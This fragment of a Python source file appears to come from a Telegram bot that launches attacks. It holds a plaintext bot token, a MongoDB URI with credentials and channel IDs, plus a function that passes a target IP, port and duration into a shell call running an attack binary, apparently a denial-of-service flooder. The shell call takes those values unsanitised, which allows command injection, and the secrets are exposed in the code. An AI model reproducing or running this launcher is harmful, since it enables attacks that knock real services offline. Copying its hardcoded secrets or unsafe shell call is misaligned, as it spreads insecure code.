...
TOKEN = '7107039898:AAGvH9P6i_4AyZZuUOUVIVHqBR8XbLzBrho'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002129899821
CHANNEL_ID = -1002129899821
error_channel_id = -1002129899821
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./vof {target_ip} {target_port} {duration} 900")
